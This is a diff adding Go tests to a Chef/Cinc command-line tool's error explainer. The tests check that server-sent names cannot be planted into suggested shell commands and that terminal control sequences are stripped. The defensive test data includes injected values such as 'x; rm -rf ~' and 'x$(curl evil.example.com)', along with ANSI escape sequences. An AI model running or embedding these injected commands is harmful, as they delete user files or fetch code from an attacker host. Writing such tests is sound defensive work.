@@ -4,6 +4,7 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"net"
 	"net/http"
 	"net/http/httptest"
 	"strings"
@@ -279,5 +280,67 @@ func TestExplainForLeavesOtherStatusesAlone(t *testing.T) {
 	raw, _ = serverError(t, "GET", "/organizations/acme/nodes/web1", 404, `{"error":["Cannot load node web1"]}`)
 	if got := Explain(raw); got != raw {
 		t.Errorf("Explain(404) = %v, want it unchanged; ExplainFor is the one that explains server errors", got)
+	}
+}
+
+// A suggested command is built from local values only: a name the server
+// quoted back goes into one only when it is a plain Chef name, so a hostile
+// server can't plant a shell command for the user to paste.
+func TestExplainKeepsServerTextOutOfSuggestedCommands(t *testing.T) {
+	body := `{"error":["Invalid signature for user or client 'x; rm -rf ~'"]}`
+	raw, target := serverError(t, "GET", "/organizations/acme/nodes", 401, body)
+	msg := explainServer(t, raw, target)
+	wantMentions(t, msg, progname.Get()+" client reregister tim`", progname.Get()+" user key create tim <key-name>`")
+	if strings.Contains(msg, "reregister x") || strings.Contains(msg, "create x;") {
+		t.Errorf("a server-sent name reached a suggested command:\n%s", msg)
+	}
+
+	// With no profile to fall back on, the command gets a placeholder.
+	msg = explainServer(t, raw, Target{})
+	wantMentions(t, msg, progname.Get()+" client reregister <name>`")
+	if strings.Contains(msg, "reregister x") {
+		t.Errorf("a server-sent name reached a suggested command:\n%s", msg)
+	}
+
+	raw, _ = serverError(t, "GET", "/organizations/acme/nodes/web1", 403,
+		`{"error":["'x$(curl evil.example.com)' not associated with organization 'acme'"]}`)
+	msg = explainServer(t, raw, target)
+	if strings.Contains(msg, "create x$(") || strings.Contains(msg, "add x$(") {
+		t.Errorf("a server-sent name reached a suggested command:\n%s", msg)
+	}
+	wantMentions(t, msg, progname.Get()+" org invite create tim`")
+}
+
+// Control characters and ANSI escape sequences in the server's message are
+// stripped before it is printed to the terminal.
+func TestExplainStripsControlCharactersFromServerText(t *testing.T) {
+	body := `{"error":["\u001b[2J\u001b[31mmissing delete permission\u001b[0m\u0007\rspoofed"]}`
+	raw, target := serverError(t, "DELETE", "/organizations/acme/nodes/web1", 403, body)
+	msg := explainServer(t, raw, target)
+	for _, bad := range []string{"\x1b", "\x07", "\r"} {
+		if strings.Contains(msg, bad) {
+			t.Errorf("explained error kept control character %q:\n%q", bad, msg)
+		}
+	}
+	wantMentions(t, msg, "missing delete permission", "spoofed")
+
+	raw, target = serverError(t, "POST", "/organizations/acme/clients", 400, `{"error":["bad\u001b]0;title\u0007 key"]}`)
+	if msg := explainServer(t, raw, target); strings.Contains(msg, "\x1b") || strings.Contains(msg, "\x07") {
+		t.Errorf("a 400 kept control characters:\n%q", msg)
+	}
+}
+
+// An error that isn't a *url.Error or a *cinc.ErrorResponse, such as a
+// Supermarket command's own wrapping of a *net.OpError, passes through
+// untouched.
+func TestExplainForLeavesNonURLNetworkErrorsAlone(t *testing.T) {
+	opErr := &net.OpError{Op: "dial", Net: "tcp", Err: errors.New("connection refused")}
+	for _, err := range []error{
+		fmt.Errorf("we couldn't reach supermarket.example.com: %w", opErr),
+		fmt.Errorf("lookup: %w", &net.DNSError{Name: "supermarket.example.com", Err: "no such host"}),
+	} {
+		if got := ExplainFor(err, Target{ServerURL: "https://cinc.example.com"}); got != err {
+			t.Errorf("ExplainFor(%v) = %v, want it unchanged", err, got)
+		}
 	}
 }
